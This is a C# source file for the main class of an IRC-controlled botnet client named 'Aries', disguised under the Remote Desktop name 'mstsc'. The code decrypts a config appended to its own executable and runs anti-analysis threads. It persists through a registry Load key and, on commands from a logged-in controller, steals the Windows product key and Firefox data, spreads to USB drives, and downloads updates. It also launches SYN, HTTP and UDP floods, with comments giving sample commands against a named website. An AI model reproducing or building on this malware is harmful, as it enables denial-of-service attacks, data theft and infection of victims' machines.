/*
Copyright (c) 2011 EAX

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

using System;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using mstsc.Aries.Antis;
using mstsc.IRC;

namespace mstsc
{
    sealed class Main
    {
        long startTicks = DateTime.Now.Ticks;
        public static bool createdNew;
        public static Mutex mutex;

        #region Singleton
        static Main _Instance;
        static readonly object PadLock = new object();

        public static Main Instance
        {
            get
            {
                lock (PadLock)
                {
                    /*if (_Instance == null)
                    {
                        _Instance = new Main();
                    }
                    return _Instance;*/

                    return _Instance ?? (_Instance = new Main());
                }
            }
        }
        #endregion

        public Client IRCClient;

        public void BotStart()
        {
            new Thread(Instance.lowTimer).Start();
            //new Thread(new ThreadStart(Main.Instance.AntiTimer)).Start();
            Aries.Util.AntiThread.Start();

            //Anti_Timer.Interval = 60000;
            //Anti_Timer.Tick += new EventHandler(AntiTimer);
            //Anti_Timer.Start();

            /*FileSystem.FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
            string HostFile = Strings.Space(Convert.ToInt32(FileSystem.LOF(1)));
            FileSystem.FileGet(1, ref HostFile, -1);
            FileSystem.FileClose(1);*/
            string HostFile =
                Encoding.Default.GetString(System.IO.File.ReadAllBytes(System.Windows.Forms.Application.ExecutablePath));

            string[] HFile = Strings.Split(HostFile, "&^*", -1, CompareMethod.Text);
            HFile[1] = Config.FSplit + Encoding.Default.GetString(Decompress.DecompressData(Encoding.Default.GetBytes(HFile[1])));

            Config.File = Strings.Split(HostFile, Config.FSplit, -1, CompareMethod.Text);
            Config.ErrAnti = Strings.Split(HFile[1], Config.FSplit2, -1, CompareMethod.Text);
            Config.Settings = Strings.Split(HFile[1], Config.FSplit3, -1, CompareMethod.Text);
            Config.IRCSettings = Strings.Split(HFile[1], Config.FSplit4, -1, CompareMethod.Text);
            Config.File[1] = Strings.Split(Config.File[1], Config.FSplit2, -1, CompareMethod.Text)[0];
            mutex = new Mutex(false, new Config().SafeAnti(Config.SafeAntiType.Mutex), out createdNew);
            //compress -> reverse -> encrypt
            //decrypt -> reverse -> decompress
            Config AntiCls = new Config();
            SimpleAES aes = new SimpleAES();

            if (Convert.ToBoolean(AntiCls.SafeAnti(Config.SafeAntiType.Encrypted)))
            { Config.File[1] = aes.Decrypt(Encoding.Default.GetBytes(Config.File[1])); }

            if (Convert.ToBoolean(AntiCls.SafeAnti(Config.SafeAntiType.compressed)))
            { Config.File[1] = Encoding.Default.GetString(Decompress.DecompressData(Encoding.Default.GetBytes(Config.File[1]))); }

            Config.File[1] = Reverse(Config.File[1]);

            new Thread(Aries.FileRegistry.SetAllFilesReg).Start();
        }

        /// <summary>
        /// Reverse a string
        /// </summary>
        /// <param name="x">String to reverse</param>
        public string Reverse(string x)
        {
            char[] charArray = new char[x.Length];
            int len = x.Length - 1;
            for (int i = 0; i <= len; i++)
                charArray[i] = x[len - i];
            return new string(charArray);
        }

        /// <summary>
        /// Call SetProcessWorkingSetSize
        /// </summary>
        private void lowTimer()
        {
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            while (true)
            {
                long ticks = DateTime.Now.Ticks;
                if ((ticks - Instance.startTicks) > 0x989680L)
                {
                    Instance.startTicks = ticks;
                    System.Diagnostics.Process currentProcess = System.Diagnostics.Process.GetCurrentProcess();
                    Aries.Util.SetProcessWorkingSetSize(currentProcess.Handle, -1, -1);
                    currentProcess.Dispose();
                }
                Thread.Sleep(500);
            }
        }

        /// <summary>
        /// Run Anti's, check registry key
        /// </summary>
        public void AntiTimer()
        {
            Thread.Sleep(60000);
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            while (true)
            {
                Microsoft.Win32.Registry.CurrentUser.
                    CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows").SetValue("Load", Aries.Util.ShortPath);
                new Thread(new ProcessAntis().Process).Start();
                Thread.Sleep(60000);
            }
        }

        public void OnMessage(object sender, OnMessageEventArgs e)
        {
            string Message = e.Message.Split(':')[2];
            string Command = (Message.Contains(" ")) ? Message.Split(' ')[0] : Message;
            string[] CommandParams = e.Message.Substring(e.Message.IndexOf(Command) + Command.Length).Split(' ');

            //if (!mstsc.Aries.Config.LoggedIn)
            {
                switch (Aries.Config.ProtectNum)
                {
                    case 1:
                        if (Command.StartsWith(Aries.Config.CommandPrefix + "Login"))
                            if (CommandParams[1] == Client.IRCVars(Client.Type.LoginPass))
                            {
                                Aries.Config.LoggedIn = true;
                                IRCClient.MessageCurrentChannel("{Login} Login successful");
                                return;
                            }
                            else
                            {
                                IRCClient.MessageCurrentChannel("{Login} Invalid password");
                                return;
                            }
                        break;


                    case 2:
                        if (e.Sender.Host == Client.IRCVars(Client.Type.AuthHost))
                        {
                            Aries.Config.LoggedIn = true;
                            //this.IRCClient.MessageCurrentChannel("{Login} Login successful");
                        }
                        else
                        {
                            IRCClient.MessageCurrentChannel("{Login} Invalid host");
                            return;
                        }
                        break;


                    case 3:
                        if ((Command == Aries.Config.CommandPrefix + "Login"))
                        {
                            if (e.Sender.Host == Client.IRCVars(Client.Type.AuthHost))
                            {
                                if (CommandParams[1] == Client.IRCVars(Client.Type.LoginPass))
                                {
                                    Aries.Config.LoggedIn = true;
                                    IRCClient.MessageCurrentChannel("{Login} Login successful");
                                }
                                else
                                {
                                    IRCClient.MessageCurrentChannel("{Login} Invalid password");
                                    return;
                                }
                            }
                            else
                            {
                                IRCClient.MessageCurrentChannel("{Login} Invalid host");
                                return;
                            }
                        }
                        else if (Aries.Config.LoggedIn & (e.Sender.Host != Client.IRCVars(Client.Type.AuthHost)))
                        {
                            IRCClient.MessageCurrentChannel("{Login} Invalid host");
                            return;
                        }
                        break;
                }
            }
            if (Aries.Config.LoggedIn) //(e.Sender.Host == IRC.Client.IRCVars(Client.Type.AuthHost))
            {
                if (Aries.Util.IncludesNick(CommandParams, IRCClient.Nick))
                {
                    switch (Command)
                    {
                        case Aries.Config.CommandPrefix + "Release":
                            {
                                new Aries.Commands.Release();
                            } break;

                        case Aries.Config.CommandPrefix + "Update":
                            {
                                new Aries.Commands.Update(CommandParams);
                            } break;

                        case Aries.Config.CommandPrefix + "WindowsKey":
                            {
                                new Aries.Commands.WindowsKey();
                            } break;

                        case Aries.Config.CommandPrefix + "Drives":
                            {
                                new Aries.Commands.Drives();
                            } break;

                        case Aries.Config.CommandPrefix + "Spread":
                            {
                                new Aries.Commands.Spread();
                                IRCClient.MessageCurrentChannel("{Spread} Spread to USB drives complete");
                            } break;

                        case Aries.Config.CommandPrefix + "Info":
                            {
                                new Aries.Commands.Info();
                            } break;

                        case Aries.Config.CommandPrefix + "Version":
                            {
                                new Aries.Commands.Version();
                            } break;

                        case Aries.Config.CommandPrefix + "Download":
                            {
                                new Aries.Commands.Download(CommandParams);
                            } break;

                        case Aries.Config.CommandPrefix + "SpeedTest":
                            {
                                new Aries.Commands.SpeedTest(CommandParams);
                            } break;

                        case Aries.Config.CommandPrefix + "Die":
                            {
                                new Aries.Commands.Die();
                            } break;

                        case Aries.Config.CommandPrefix + "Firefox":
                            {
                                new Aries.Commands.Firefox();
                            } break;

                        case Aries.Config.CommandPrefix + "StopFlood":
                            {
                                new Aries.Commands.Flooders.StopFlood();
                            } break;

                        case Aries.Config.CommandPrefix + "Part":
                            {
                                new Aries.Commands.Part(CommandParams);
                            } break;
                        /* TODO: make the flooder commands fit in with how i did commands above*/

                        case Aries.Config.CommandPrefix + "SYN":
                            try //`SYN testbot http://slo-hacker.com/ 80 2 5
                            {
                                if (Aries.Config.Flooding)
                                {
                                    IRCClient.MessageCurrentChannel("{SYN} Already flooding " + Aries.Commands.Flooders.SYN.sFHost +
                                        ". Use `StopFlood command to stop current flood before starting another");
                                    break;
                                }
                                IRCClient.MessageCurrentChannel("{SYN} Starting flood...");
                                Aries.Commands.Flooders.SYN.sFHost = Convert.ToString(CommandParams[2]);
                                Aries.Commands.Flooders.SYN.uPort = Int32.Parse(CommandParams[3]);
                                Aries.Commands.Flooders.SYN.iThreads = Int32.Parse(CommandParams[4]);
                                Aries.Commands.Flooders.SYN.StartSYNFlood();
                            }
                            catch (Exception ex)
                            {
                                IRCClient.MessageCurrentChannel("{SYN} Error: " + ex.Message);
                            }
                            break;

                        case Aries.Config.CommandPrefix + "HTTP":
                            try //`HTTP testbot http://slo-hacker.com 80 5
                            {
                                if (Aries.Config.Flooding)
                                {
                                    IRCClient.MessageCurrentChannel("{HTTP} Already flooding " + Aries.Commands.Flooders.HTTP.sFHost +
                                        ". Use `StopFlood command to stop current flood before starting another");
                                    break;
                                }
                                IRCClient.MessageCurrentChannel("{HTTP} Starting flood...");
                                Aries.Commands.Flooders.HTTP.sFHost = Convert.ToString(CommandParams[2]);
                                Aries.Commands.Flooders.HTTP.Port = Int32.Parse(CommandParams[3]);
                                Aries.Commands.Flooders.HTTP.iThreads = Convert.ToInt32(CommandParams[4]);
                                //Aries.Commands.Flooders.SYN.iSSockets = Convert.ToInt32(CommandParams[5]);
                                Aries.Commands.Flooders.HTTP.StartHTTPFlood();
                            }
                            catch (Exception ex)
                            {
                                IRCClient.MessageCurrentChannel("{HTTP} Error: " + ex.Message);
                            }
                            break;

                        case Aries.Config.CommandPrefix + "UDP":
                            try //`UDP testbot http://slo-hacker.com 80 5 1 5000
                            {
                                if (Aries.Config.Flooding)
                                {
                                    IRCClient.MessageCurrentChannel("{UDP} Already flooding " + Aries.Commands.Flooders.UDP.sFHost +
                                        ". Use `StopFlood command to stop current flood before starting another");
                                    break;
                                }
                                IRCClient.MessageCurrentChannel("{UDP} Starting flood...");
                                Aries.Commands.Flooders.UDP.sFHost = Convert.ToString(CommandParams[2]);
                                Aries.Commands.Flooders.UDP.uPort = Int32.Parse(CommandParams[3]);
                                Aries.Commands.Flooders.UDP.iThreads = Convert.ToInt32(CommandParams[4]);
                                new Aries.Commands.Flooders.UDP().StartUDPFlood();
                            }
                            catch (Exception ex)
                            {
                                IRCClient.MessageCurrentChannel("{UDP} Error: " + ex.Message);
                            }
                            break;
                    }
                }
            }
        }
    }
}